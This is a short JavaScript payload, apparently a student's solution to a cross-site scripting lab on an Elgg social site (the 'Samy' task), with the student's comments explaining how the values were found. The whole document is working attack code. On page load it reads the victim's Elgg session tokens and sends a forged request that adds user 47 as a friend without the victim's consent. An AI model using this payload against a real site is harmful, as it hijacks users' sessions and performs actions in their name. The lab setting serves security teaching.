<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var guid = elgg.session.user.guid;
	// I inspected inspector and body,there i looked at the js code where I ovserved above ts and token provided by teacher.Thus I traced the guid of a user
    console.log(token);
	//Construct the HTTP request to add Samy as a friend.
    var sendurl= "/action/friends/add?friend=47"+ts+token+ts+token; //FILL IN
    // I inspected network tab and the get request.I copied it here and replaced the values with above varialbes.I looked at ajax set header and removed the web address.

	//Create and send Ajax request to add friend
	if(guid!=47) //samy's guid is 47 so excluding him from attack
		{
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		}

	}
</script>
